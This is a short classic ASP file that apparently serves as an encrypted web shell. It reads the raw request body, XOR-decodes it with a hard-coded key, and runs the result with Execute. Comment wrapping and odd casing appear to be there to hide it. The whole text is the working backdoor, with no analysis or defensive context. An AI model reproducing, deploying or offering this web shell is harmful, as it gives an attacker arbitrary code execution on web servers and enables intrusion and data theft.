<% 
<!-- 
Response.CharSet = "UTF-8" 
BCAKN0="7776822a1e8027a5"  
Session("k")=BCAKN0 
C7dc=Request.TotalBytes 
QNGSU=Request.BinaryRead(C7dc) 
For i=1 To C7dc 
LEn75Z=ascb(midb(QNGSU,i,1)) Xor Asc(Mid(BCAKN0,(i and 15)+1,1))  
VSRBJ=VSRBJ + Chr(LEn75Z) 
Next 
eXecUtE(VSRBJ)REM ) 
-->
%>